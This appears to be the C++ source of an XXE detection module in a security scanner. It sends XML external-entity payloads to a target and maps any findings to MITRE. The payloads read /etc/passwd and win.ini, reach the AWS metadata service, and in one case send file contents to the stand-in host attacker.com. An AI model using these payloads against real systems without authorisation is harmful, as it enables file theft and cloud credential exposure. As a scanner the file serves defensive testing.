#include "../include/XXEDetector.h"
#include "../include/mitre/AttackMapper.h"
#include <sstream>
#include <vector>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define closesocket close
#endif

namespace {
    struct XXEPayload {
        std::string payload;
        std::string description;
        std::vector<std::string> success_indicators;
    };

    std::vector<XXEPayload> getXXEPayloads() {
        return {
            {
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "File disclosure (Linux /etc/passwd)",
                {"root:", "bin:", "daemon:", "nobody:"}
            },
            {
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
                "File disclosure (Windows win.ini)",
                {"[fonts]", "[extensions]", "[files]"}
            },
            {
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
                "SSRF to AWS metadata",
                {"ami-id", "instance-id", "public-ipv4"}
            },
            {
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%xxe;'>\">%eval;%exfil;]><foo/>",
                "Out-of-band XXE (OOB-XXE)",
                {"root:", "bin:"}
            },
            {
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
                "PHP filter wrapper",
                {"cm9vdDo", "YmluOg=="}  // base64 encoded "root:" and "bin:"
            }
        };
    }

    std::string sendXMLPayload(const std::string& host, int port, const std::string& xml_payload) {
        std::stringstream request;
        request << "POST /api/xml HTTP/1.1\r\n";
        request << "Host: " << host << "\r\n";
        request << "Content-Type: application/xml\r\n";
        request << "Content-Length: " << xml_payload.length() << "\r\n";
        request << "User-Agent: C3NT1P3D3-Scanner/2.0\r\n";
        request << "Connection: close\r\n\r\n";
        request << xml_payload;
        
        std::string requestStr = request.str();
        
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
#endif
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
#ifdef _WIN32
            WSACleanup();
#endif
            return "";
        }
        
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            closesocket(sock);
#ifdef _WIN32
            WSACleanup();
#endif
            return "";
        }
        
        send(sock, requestStr.c_str(), requestStr.length(), 0);
        
        std::string response;
        char buffer[4096];
        int bytes_received;
        
        while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[bytes_received] = '\0';
            response += buffer;
        }
        
        closesocket(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        
        return response;
    }

    bool containsIndicator(const std::string& response, const std::vector<std::string>& indicators) {
        for (const auto& indicator : indicators) {
            if (response.find(indicator) != std::string::npos) {
                return true;
            }
        }
        return false;
    }
} // end anonymous namespace

ModuleResult XXEDetector::run(const MockTarget& target) {
    if (!target.isServiceOpen("HTTP")) {
        return ModuleResult{
            "XXEDetector",
            false,
            "HTTP service not available",
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }

    std::string targetIp = target.id();
    if (target.ip().has_value()) {
        targetIp = target.ip().value();
    }

    try {
        std::string details = "XXE (XML External Entity) Vulnerability Assessment\n";
        details += "===================================================\n\n";
        
        bool vulnerabilityFound = false;
        std::vector<std::string> foundVulnerabilities;
        
        auto payloads = getXXEPayloads();
        
        details += "Testing " + std::to_string(payloads.size()) + " XXE injection payloads...\n\n";
        
        // Test first 3 payloads for safety
        size_t maxTests = (payloads.size() < 3) ? payloads.size() : 3;
        for (size_t i = 0; i < maxTests; ++i) {
            const auto& test = payloads[i];
            
            std::string response = sendXMLPayload(targetIp, 80, test.payload);
            
            if (!response.empty() && containsIndicator(response, test.success_indicators)) {
                vulnerabilityFound = true;
                foundVulnerabilities.push_back(test.description);
                details += "✗ XXE vulnerability detected\n";
                details += "  Type: " + test.description + "\n";
                details += "  Response contained sensitive data\n\n";
            }
        }
        
        if (!vulnerabilityFound) {
            details += "✓ No XXE vulnerabilities detected\n\n";
        }
        
        details += "XXE Vulnerability Details:\n";
        details += "- Allows reading local files on the server\n";
        details += "- Can be used for SSRF attacks\n";
        details += "- May lead to remote code execution\n";
        details += "- Common in SOAP, REST APIs, and file upload features\n\n";
        
        details += "Attack Vectors Tested:\n";
        details += "- Local file disclosure (Linux)\n";
        details += "- Local file disclosure (Windows)\n";
        details += "- SSRF to cloud metadata services\n";
        details += "- Out-of-band XXE (OOB-XXE)\n";
        details += "- PHP filter wrappers\n\n";
        
        details += "Recommendations:\n";
        details += "1. Disable XML external entity processing\n";
        details += "2. Use less complex data formats (JSON instead of XML)\n";
        details += "3. Patch or upgrade XML processors\n";
        details += "4. Implement input validation and sanitization\n";
        details += "5. Use whitelisting for XML schemas\n";
        details += "6. Disable DTD (Document Type Definition) processing\n";
        details += "7. Implement proper error handling (don't expose errors)\n";

        ModuleResult result;
        result.id = "XXEDetector";
        result.targetId = target.id();
        result.details = details;
        
        if (vulnerabilityFound) {
            result.success = true;
            result.message = "XXE vulnerabilities detected (" + std::to_string(foundVulnerabilities.size()) + " types)";
            result.severity = Severity::Critical;
            
            auto& mapper = C3NT1P3D3::MITRE::AttackMapper::getInstance();
            auto technique = mapper.mapVulnerability("XXE");
            
            if (technique.has_value()) {
                result.attackTechniqueId = technique->techniqueId;
                result.attackTactics = {"Initial Access"};
                result.mitigations = technique->mitigations;
            }
        } else {
            result.success = false;
            result.message = "No XXE vulnerabilities detected";
            result.severity = Severity::Low;
        }
        
        return result;
    }
    catch (const std::exception& ex) {
        ModuleResult result;
        result.id = "XXEDetector";
        result.success = false;
        result.message = std::string("Exception during XXE scan: ") + ex.what();
        result.severity = Severity::Low;
        result.targetId = target.id();
        return result;
    }
}
